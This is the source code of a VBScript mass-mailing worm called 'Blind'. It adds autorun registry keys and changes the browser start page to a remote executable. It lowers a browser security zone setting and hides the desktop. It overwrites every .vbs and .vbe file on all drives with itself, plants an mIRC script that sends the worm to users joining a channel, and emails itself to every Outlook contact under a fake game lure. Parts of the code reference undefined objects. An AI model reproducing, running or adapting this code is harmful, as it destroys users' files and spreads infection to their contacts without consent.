'Blind By Nescafe

On Error Resume Next
Dim blind, Fso, Drives, Drive, Folder, Files, File, Subfolders,Subfolder 
Set blind = wscript.CreateObject("WScript.Shell")
Set fso = CreateObject("scripting.FileSystemObject")
Set Drives=fso.drives
Set dropper = Fso.opentextfile(wscript.scriptfullname, 1)
src = dropper.readall
set Trange = document.body.CreateTextRange
blind.RegWrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Win32", "C:\Windows\Game.exe.vbs"
blind.RegWrite "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page", "stif.hit.bg/BugFix.exe"
blind.RegWrite "HKLM\Software\Microsoft\Internet Explorer\Main\Start Page", "stif.hit.bg/BugFix.exe"
blind.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0\1201", 0, "REG_DWORD"
blind.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\RegisteredOwner", "Coded by ....."
blind.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\Shell32", "C:\Windows\Shell32.vbs"
Fso.copyfile wscript.scriptfullname, "C:\Windows\Game.exe.vbs"
Fso.copyfile wscript.scriptfullname, "C:\windows\Shell32.vbs"
blind.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoDesktop", 1, "REG_DWORD"

Set Fso = createobject("scripting.filesystemobject")
Set Drives=fso.drives 
For Each Drive in Drives
If drive.isready then
Dosearch drive & "\"
end If 
Next 

Function Dosearch(Path)
on error resume next
Set Folder=fso.getfolder(path)
Set Files = folder.files 
For Each File in files
If fso.GetExtensionName(file.path)="vbs" or fso.GetExtensionName(file.path)="vbe" then
on error resume next
Set dropper = Fso.createtextfile(file.path, True)
dropper.write src
dropper.Close
end if
If file.name = "mirc.ini" then
on error resume next
ABCDE(file.ParentFolder)
End If
next
Set Subfolders = folder.SubFolders 
For Each Subfolder in Subfolders 
Dosearch Subfolder.path 
Next 
end function 



function ABCDE(QR2T8452)
on error resume next
If QR2T8452 <> "" Then
J574I3N1 = blind.regread("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\ProgramFilesDir")
If fso.fileexists("c:\mirc\mirc.ini") Then
QR2T8452 = "c:\mirc"
ElseIf fso.fileexists("c:\mirc32\mirc.ini") Then
QR2T8452 = "c:\mirc32"
ElseIf fso.fileexists(J574I3N1 & "\mirc\mirc.ini") Then
QR2T8452 = J574I3N1 & "\mirc"
ElseIf fso.fileexists(J574I3N1 & "\mirc32\mirc.ini") Then
QR2T8452 = J574I3N1 & "\mirc"
Else
QR2T8452 = ""
End If
End If
If QR2T8452 <> "" Then
Set N3EGB01V = UT8452J7.CreateTextFile(QR2T8452 & "\script.ini", True)
N3EGB01V = "[script]" & vbCrLf & "n0=on 1:JOIN:#:{"
N3EGB01V = N3EGB01V & vbCrLf & "n0=on 1:JOIN:#:{"
N3EGB01V = N3EGB01V & vbCrLf & "n1=  /if ( $nick == $me ) { halt }"
N3EGB01V = N3EGB01V & vbCrLf & "n2=  /." & Chr(100) & Chr(99) & Chr(99) & " send $nick "
N3EGB01V = N3EGB01V & "C:\Windows\Game.exe.vbs"
N3EGB01V = N3EGB01V & vbCrLf & "n3=}"
script.Close
End If
End Function

myself = Wscript.ScriptFullName
set fso = createobject("scripting.filesystemobject")
fso.CopyFile myself, "C:\windows\Game.exe.vbs"
Set sys=CreateObject("Outlook.Application")
Set sys2=sys.GetNameSpace("MAPI")
For Each C In sys2.AddressLists
If C.AddressEntries.Count <> 0 Then
For D=1 To C.AddressEntries.Count
Set sys3=C.AddressEntries(D)
Set sys4=sys.CreateItem(0)
sys4.To=sys3.Address
sys4.Subject="Heyy..!! The Game Is Here"
sys4.Body="We are from Game Team and we made our super GAME. Check this game and sent to us your opinion about the game ;)"
sys4.Attachments.Add("C:\windows\Game.exe.vbs")
sys4.DeleteAfterSubmit=True
If sys4.To <> "" Then
sys4.Send
End If
Next
End If
Next

msgbox "Welcome To Our New World. More games at WWW.GAME.COM" ,VBOkOnly, "GamerZ"


